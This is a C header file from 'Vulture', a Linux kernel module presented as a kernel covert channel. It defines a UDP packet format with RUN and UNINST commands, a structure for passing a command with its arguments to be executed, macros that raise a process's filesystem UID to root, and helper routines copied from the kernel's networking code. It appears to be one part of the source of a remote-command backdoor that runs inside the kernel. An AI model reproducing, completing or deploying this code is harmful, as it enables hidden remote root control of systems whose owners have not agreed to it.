/*
 *  Vulture - Kernel Covert Channel
 *
 *  Copyright (C) 2003 by rd <rd@vnsecurity.net>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 *  Greets to THC & vnsecurity
 *
 */
#ifndef _VULTURE_H_
#define _VULTURE_H_
                 
#ifdef __KERNEL__
#ifndef KERNEL_VERSION
#define KERNEL_VERSION(a,b,c) (((a) << 16) + ((b) << 8) + (c))
#endif

#ifdef MODULE_LICENSE
MODULE_LICENSE("GPL");
MODULE_AUTHOR("rd@vnsecurity.net");
#endif

#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }

#define BEGIN_ROOT { int saved_fsuid = current->fsuid; current->fsuid = 0;
#define END_ROOT current->fsuid = saved_fsuid; }
#endif

struct vulturehdr {
	__u8    cmd;
	__u8    state;
	__u16   len;
	__u32   magic;
	/* nothing more yet */
};

struct vulture_buff {
	struct sk_buff *skb;
        struct vulturehdr *vultureh; 
        char *data;
};

#define kfree_vbuf(v)		\
{				\
	__kfree_skb(v->skb);	\
        kfree(v);		\
}

/* commands */
enum {
  VULTURE_RUN = 1,
  VULTURE_UNINST,

  VULTURE_MAX_CMDS /* leave this at the end */
};

/* states */
enum {
  VULTURE_SUCCESS = 1,
  VULTURE_FAILED,
  VULTURE_CONT,
};

#define VULTURE_HDR_LEN sizeof(struct vulturehdr)

#define MAX_UDP_CHUNK 1460
#define MAX_UDP_DATA_CHUNK (MAX_UDP_CHUNK - VULTURE_HDR_LEN)
#define MAX_SKB_SIZE (MAX_UDP_CHUNK + sizeof(struct udphdr) + \
			sizeof(struct iphdr) + sizeof(struct ethhdr))

#define MAX_DATA_LEN MAX_UDP_DATA_CHUNK
#define MAX_BUFFER_LEN MAX_DATA_LEN

#ifdef __KERNEL__
typedef struct exec_param_s {
       char *command;
       char **argv;  
       char **envp;
} exec_param_t;

/* helper functions */

static inline void flush_signal_handlers(struct task_struct *t)
{
        int i;
        struct k_sigaction *ka = &t->sig->action[0];
        for (i = _NSIG ; i != 0 ; i--) {
                if (ka->sa.sa_handler != SIG_IGN)
                        ka->sa.sa_handler = SIG_DFL;
                ka->sa.sa_flags = 0;
                sigemptyset(&ka->sa.sa_mask);
                ka++;
        }
}

static inline void flush_current_signals(void)
{
        spin_lock_irq(&current->sigmask_lock);
        flush_signals(current);
        recalc_sigpending(current);
        spin_unlock_irq(&current->sigmask_lock);
} 

/*
 * Ripped from neighbour.c
 */
static inline void neigh_hh_init(struct neighbour *n, struct dst_entry *dst, u16 protocol)
{                       
        struct hh_cache *hh = NULL;
        struct net_device *dev = dst->dev;
                        
        for (hh=n->hh; hh; hh = hh->hh_next)
                if (hh->hh_type == protocol)
                        break;
                        
        if (!hh && (hh = kmalloc(sizeof(*hh), GFP_ATOMIC)) != NULL) {
                memset(hh, 0, sizeof(struct hh_cache));
                hh->hh_lock = RW_LOCK_UNLOCKED;
                hh->hh_type = protocol;
                atomic_set(&hh->hh_refcnt, 0);
                hh->hh_next = NULL;
                if (dev->hard_header_cache(n, hh)) {
                        kfree(hh);
                        hh = NULL;
                } else {
                        atomic_inc(&hh->hh_refcnt);
                        hh->hh_next = n->hh;
                        n->hh = hh;
                        if (n->nud_state&NUD_CONNECTED)
                                hh->hh_output = n->ops->hh_output;
                        else
                                hh->hh_output = n->ops->output;
                }
        }
        if (hh) {
                atomic_inc(&hh->hh_refcnt);
                dst->hh = hh;
        }
}

/* 
 * Resolve neighbour
 * Ripped from neigh_resolve_output
 */
static inline int neigh_resolve(struct sk_buff *skb)
{
        struct dst_entry *dst = skb->dst;
        struct neighbour *neigh;

        if (!dst || !(neigh = dst->neighbour))
                return -EINVAL;

        __skb_pull(skb, skb->nh.raw - skb->data);

        if (neigh_event_send(neigh, skb) == 0) {
                int err;
                struct net_device *dev = neigh->dev;
                if (dev->hard_header_cache && dst->hh == NULL) {
                        write_lock_bh(&neigh->lock);
                        if (dst->hh == NULL)
                                neigh_hh_init(neigh, dst, dst->ops->protocol);
                        err = dev->hard_header(skb, dev, ntohs(skb->protocol), neigh->ha, NULL, skb->len);
                        write_unlock_bh(&neigh->lock);
                } else {
                        read_lock_bh(&neigh->lock);
                        err = dev->hard_header(skb, dev, ntohs(skb->protocol), neigh->ha, NULL, skb->len);
                        read_unlock_bh(&neigh->lock);
                }
                if (err >= 0)
                        return 0;
        }

        return -EINVAL;
}
#endif

#endif /* _VULTURE_H_ */
